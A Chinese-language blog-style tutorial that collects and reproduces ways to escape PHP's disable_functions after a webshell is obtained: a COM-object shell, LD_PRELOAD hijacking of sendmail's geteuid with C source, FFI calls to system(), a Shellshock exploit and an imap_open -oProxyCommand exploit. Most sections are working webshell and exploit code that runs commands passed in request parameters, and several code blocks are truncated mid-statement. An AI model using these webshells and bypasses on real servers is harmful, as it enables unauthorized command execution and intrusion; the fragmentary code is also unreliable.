## 前言
前几个月在某行动中发现webshell执行命令返回`ret=127`，听前辈说起这是由于disable_functions的限制,到暑假才又想起这个事,特此总结与复现了一些bypass的姿势.如有错误，请师傅们不吝赐教。
## disable_functions
disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。
比如拿到一个webshell,用管理工具去连接,执行命令发现`ret=127`,实际上就是因为被这个限制的原因
## 黑名单
    assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
观察php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。
## 利用Windows组件COM绕过
查看`com.allow_dcom`是否开启,这个默认是不开启的。
创建一个COM对象,通过调用COM对象的`exec`替我们执行命令
    exec("cmd /c".$command);
        $stdout = $exec->StdOut();
        $stroutput = $stdout->ReadAll();
        echo $stroutput;
    }
    elseif($wsh == 'application') {
        $command = $_GET['cmd'];
        $wshit = new COM("Shell.Application") or die("Shell.Application Failed!");
        $exec = $wshit->ShellExecute("cmd","/c ".$command);
    } 
    else {
      echo(0);
    }
    ?>
## 利用Linux环境变量LD_PRELOAD
### 初阶
    LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。
总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。
思路为:
  1. 创建一个.so文件,linux的动态链接库文件
  2. 使用putenv函数将`LD_PRELOAD`路径设置为我们自己创建的动态链接库文件
  3. 利用某个函数去触发该动态链接库
这里以`mail()`函数举例。  
在底层c语言中,`mail.c`中会调用`sendmail`，而sendmail_path使从ini文件中说明
    ; For Unix only.  You may supply arguments as well (default: "sendmail -t -i"). 
    ;sendmail_path =
默认为"sendmail -t -i"
但是sendmail并不是默认安装的,需要自己下载
使用命令`readelf -Ws /usr/sbin/sendmail`可以看到sendmail调用了哪些库函数,这里选择`geteuid`
创建一个`test.c`文件,并定义一个`geteuid`函数,目的是劫持该函数。
    #include 
    #include 
    #include 
    void payload() {
        system("whoami > /var/tmp/sd.txt");
    }
    int geteuid()
    {
        if (getenv("LD_PRELOAD") == NULL) { return 0; }
        unsetenv("LD_PRELOAD");
        payload();
    }
使用gcc编译为.so文件
    gcc -c -fPIC test.c -o test
    gcc -shared test -o test.so
这里有个坑:不要在windows上编译,编译出来是`MZ`头,不是`ELF`。
然后再上传test.so到指定目录下。
最后创建`shell.php`文件,上传到网站目录下,这里.so文件路径要写对。
再理一下整个过程:当我们访问shell.php文件的时候,先会将`LD_PRELOAD`路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的`whoami`命令写入到sd.txt中。
由于拿到的webshell很有可能是`www-data`这种普通权限。  
整个过程要注意权限问题,要可写的目录下。
web访问页面没有文件写出,可以看看定义的目录是否有权限。
### 进阶版
在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。
而有前辈早已指出:[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/web/192052.html)  
细节已经说的非常明白,这里只复现,在此不再画蛇添足。
去github下载三个重要文件:  
bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c  
将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so传到目标有权限的目录中。  
这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。
这里我已经卸载了sendmail文件
注意区分post和get
## 利用PHP7.4 FFI绕过
FFI（Foreign Function
Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。  
当PHP所有的命令执行函数被禁用后，通过PHP
7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass
disable_functions。  
具体请参考[Foreign Function Interface](https://www.php.net/manual/en/book.ffi.php)
当前php版本为7.4.3
先看FFI是否开启,并且ffi.enable需要设置为true
使用FFI::cdef创建一个新的FFI对象
通过c语言的system去执行,绕过disable functions。  
将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。
    system("$cmd > /tmp/SD");       //由GET传参的任意代码执行
    echo file_get_contents("/tmp/SD");
    @unlink("/tmp/SD");
    ?>
## 利用Bash Shellshock(CVE-2014-6271)破壳漏洞
利用条件php $tmp 2>&1"); 
       // In Safe Mode, the user may only alter environment variableswhose names 
       // begin with the prefixes supplied by this directive. 
       // By default, users will only be able to set environment variablesthat 
       // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
       // PHP will let the user modify ANY environment variable! 
       //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
       error_log('a',1);
       $output = @file_get_contents($tmp); 
       @unlink($tmp); 
       if($output != "") return $output; 
       else return "No output, or not vuln."; 
    } 
    echo shellshock($_REQUEST["cmd"]); 
    ?>
选择可上传目录路径,上传exp
包含文件执行
## 利用imap_open()绕过
利用条件需要安装iamp扩展,命令行输入:`apt-get install php-imap`  
在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。
基本原理为:
    PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。
EXP:
    /tmp/cmd_result") . "|base64t-d|sh}"; 
    //$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] .
    ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}'; 
    imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or
    var_dump("nnError: ".imap_last_error()); 
    sleep(5); 